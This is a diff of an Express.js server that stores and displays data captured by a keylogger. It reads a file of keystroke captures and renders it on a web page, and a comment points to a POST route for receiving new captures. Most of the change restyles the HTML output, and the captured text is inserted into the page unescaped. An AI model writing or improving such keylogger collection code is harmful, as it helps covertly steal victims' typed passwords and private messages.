@@ -9,37 +9,6 @@ app.use(bodyParser.json({ extended: true }));
 
 const port = 8080;
 
-// HTML template for the interface
-const interfaceTemplate = `
-<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Keystroke Logger</title>
-    <style>
-        body {
-            font-family: Arial, sans-serif;
-            margin: 20px;
-        }
-        h1 {
-            color: #333;
-        }
-        p {
-            color: #666;
-        }
-    </style>
-</head>
-<body>
-    <h1>Keystroke Logger</h1>
-    <div id="loggedData">
-        <h2>Logged Data</h2>
-        <p>{loggedData}</p>
-    </div>
-</body>
-</html>
-`;
-
 // Route to handle GET requests and display logged keystrokes
 app.get("/", (req, res) => {
     try {
@@ -47,16 +16,75 @@ app.get("/", (req, res) => {
         const kl_file = fs.readFileSync("./keystroke_captures.txt", { encoding: 'utf8', flag: 'r' });
         
         // Replace newline characters with <br> for HTML formatting
-        const formattedData = kl_file.replace(/\n/g, "<br>");
-        
-        // Render HTML template with logged data
-        const html = interfaceTemplate.replace("{loggedData}", formattedData);
-        res.send(html);
+        res.send(`
+            <html>
+            <head>
+                <style>
+                    body {
+                        font-family: Arial, sans-serif;
+                        margin: 0;
+                        padding: 0;
+                        background-color: #f4f4f4;
+                    }
+                    .container {
+                        max-width: 800px;
+                        margin: 20px auto;
+                        padding: 20px;
+                        background-color: #fff;
+                        border-radius: 8px;
+                        box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+                    }
+                    h1 {
+                        color: #333;
+                    }
+                    p {
+                        color: #666;
+                    }
+                </style>
+            </head>
+            <body>
+                <div class="container">
+                    <h1>Logged data</h1>
+                    <p>${kl_file.replace(/\n/g, "<br>")}</p>
+                </div>
+            </body>
+            </html>
+        `);
     } catch {
         // If file doesn't exist or any error occurs, send a message indicating no data
-        res.send(interfaceTemplate.replace("{loggedData}", "<p>Nothing logged yet.</p>"));
+        res.send(`
+            <html>
+            <head>
+                <style>
+                    body {
+                        font-family: Arial, sans-serif;
+                        margin: 0;
+                        padding: 0;
+                        background-color: #f4f4f4;
+                    }
+                    .container {
+                        max-width: 400px;
+                        margin: 20px auto;
+                        padding: 20px;
+                        background-color: #fff;
+                        border-radius: 8px;
+                        box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+                    }
+                    h1 {
+                        color: #333;
+                    }
+                </style>
+            </head>
+            <body>
+                <div class="container">
+                    <h1>Nothing Logged yet.</h1>
+                </div>
+            </body>
+            </html>
+        `);
     }
 });
+
 
 // Route to handle POST requests and save the keystrokes data
 app.post("/", (req, res) => {
